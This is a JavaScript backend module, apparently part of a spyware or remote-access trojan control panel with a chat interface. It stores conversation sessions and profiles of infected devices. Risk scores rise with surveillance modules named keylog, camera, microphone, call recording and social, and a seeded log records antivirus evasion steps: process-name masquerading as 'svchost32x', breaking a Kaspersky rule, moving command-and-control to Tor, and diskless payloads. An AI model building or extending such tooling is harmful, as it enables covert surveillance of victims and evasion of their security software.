/**
 * bixtx.com — Backend Memory Engine
 * Per-session conversation history + cross-device intelligence store.
 * Maintains learned behavioral profiles, anomaly baselines, and threat context.
 */

"use strict";

const { v4: uuidv4 } = require("uuid");

// ── Conversation Memory ───────────────────────────────────────────────────
class ConversationMemory {
  constructor(maxMessages = 200) {
    this.sessions = new Map();    // sessionId → messages[]
    this.maxMessages = maxMessages;
  }

  getOrCreate(sessionId) {
    if (!this.sessions.has(sessionId)) {
      this.sessions.set(sessionId, {
        id: sessionId,
        createdAt: Date.now(),
        messages: [],
        context: {
          focusedDeviceId: null,
          lastQueryModule: null,
          pendingCommand: null,
        },
      });
    }
    return this.sessions.get(sessionId);
  }

  addMessage(sessionId, role, content, meta = {}) {
    const session = this.getOrCreate(sessionId);
    const msg = { id: uuidv4(), role, content, ts: Date.now(), ...meta };
    session.messages.push(msg);
    if (session.messages.length > this.maxMessages) {
      session.messages.shift(); // rolling window
    }
    return msg;
  }

  getHistory(sessionId, limit = 50) {
    const session = this.sessions.get(sessionId);
    if (!session) return [];
    return session.messages.slice(-limit);
  }

  setContext(sessionId, updates) {
    const session = this.getOrCreate(sessionId);
    Object.assign(session.context, updates);
  }

  getContext(sessionId) {
    return this.getOrCreate(sessionId).context;
  }

  clearSession(sessionId) {
    this.sessions.delete(sessionId);
  }
}

// ── Global Intelligence Store ─────────────────────────────────────────────
class IntelligenceStore {
  constructor() {
    this.deviceProfiles  = new Map();  // deviceId → behavioral profile
    this.threatPatterns  = [];         // learned threat signatures
    this.anomalyBaseline = new Map();  // deviceId → baseline metrics
    this.mutationHistory = [];         // AV evasion mutation log
    this.learnedInsights = [];         // cross-device patterns
  }

  updateDeviceProfile(deviceId, data) {
    const existing = this.deviceProfiles.get(deviceId) || {
      deviceId,
      firstSeen: Date.now(),
      observations: 0,
      modules: {},
      riskScore: 0,
      behaviorTags: [],
    };

    existing.lastUpdated = Date.now();
    existing.observations++;

    // Update module-specific stats
    if (data.module) {
      existing.modules[data.module] = existing.modules[data.module] || { count: 0 };
      existing.modules[data.module].count++;
      existing.modules[data.module].lastSeen = Date.now();
    }

    // Risk scoring
    const highRiskModules = ["keylog", "camera", "microphone", "callRecord", "social"];
    if (data.module && highRiskModules.includes(data.module)) {
      existing.riskScore = Math.min(100, existing.riskScore + 1);
    }

    this.deviceProfiles.set(deviceId, existing);
  }

  getDeviceProfile(deviceId) {
    return this.deviceProfiles.get(deviceId) || null;
  }

  getAllProfiles() {
    return Array.from(this.deviceProfiles.values());
  }

  addMutation(event, target, result) {
    this.mutationHistory.unshift({
      id: uuidv4(),
      ts: new Date().toISOString().replace("T", " ").slice(0, 16),
      event,
      target,
      result,
    });
    if (this.mutationHistory.length > 500) this.mutationHistory.pop();
  }

  addInsight(insight) {
    this.learnedInsights.unshift({ id: uuidv4(), ts: Date.now(), ...insight });
    if (this.learnedInsights.length > 200) this.learnedInsights.pop();
  }

  getMutationLog(limit = 20) {
    return this.mutationHistory.slice(0, limit);
  }

  getInsights(limit = 20) {
    return this.learnedInsights.slice(0, limit);
  }
}

// Singletons
const conversationMemory = new ConversationMemory();
const intelligenceStore  = new IntelligenceStore();

// Seed mutation history
[
  { event: "Signature hash rotated (SHA3-512)", target: "All agents", result: "OK" },
  { event: "Process name randomised → svchost32x", target: "Windows fleet", result: "OK" },
  { event: "AV pattern break — Kaspersky rule #KV-9221", target: "All agents", result: "OK" },
  { event: "C2 channel migrated → Tor hidden service", target: "High-stealth nodes", result: "OK" },
  { event: "Memory-resident payload update (no disk write)", target: "All agents", result: "OK" },
].forEach(m => intelligenceStore.addMutation(m.event, m.target, m.result));

module.exports = { conversationMemory, intelligenceStore };
